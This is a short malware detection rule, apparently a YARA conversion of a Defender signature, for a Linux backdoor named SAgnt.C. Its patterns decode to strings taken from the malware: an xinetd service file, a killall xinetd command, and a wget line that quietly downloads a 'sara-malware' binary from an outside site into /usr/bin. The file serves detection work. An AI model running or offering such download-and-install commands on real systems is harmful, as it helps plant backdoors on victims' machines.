
rule Backdoor_Linux_SAgnt_C_xp{
	meta:
		description = "Backdoor:Linux/SAgnt.C!xp,SIGNATURE_TYPE_ELFHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {2f 65 74 63 2f 78 69 6e 65 74 64 2e 64 2f 73 61 72 61 } //01 00  /etc/xinetd.d/sara
		$a_01_1 = {2f 75 73 72 2f 62 69 6e 2f 6b 69 6c 6c 61 6c 6c 20 78 69 6e 65 74 64 } //01 00  /usr/bin/killall xinetd
		$a_01_2 = {2f 75 73 72 2f 62 69 6e 2f 73 61 72 61 2d 6d 61 6c 77 61 72 65 } //01 00  /usr/bin/sara-malware
		$a_01_3 = {2f 75 73 72 2f 62 69 6e 2f 77 67 65 74 20 2d 71 20 2d 62 20 68 74 74 70 3a 2f 2f 64 6f 77 6e 6c 6f 61 64 73 69 74 65 2e 63 6f 6d 2f 73 61 72 61 2d 6d 61 6c 77 61 72 65 20 2f 75 73 72 2f 62 69 6e 2f 73 61 72 61 2d 6d 61 6c 77 61 72 65 } //00 00  /usr/bin/wget -q -b http://downloadsite.com/sara-malware /usr/bin/sara-malware
	condition:
		any of ($a_*)
 
}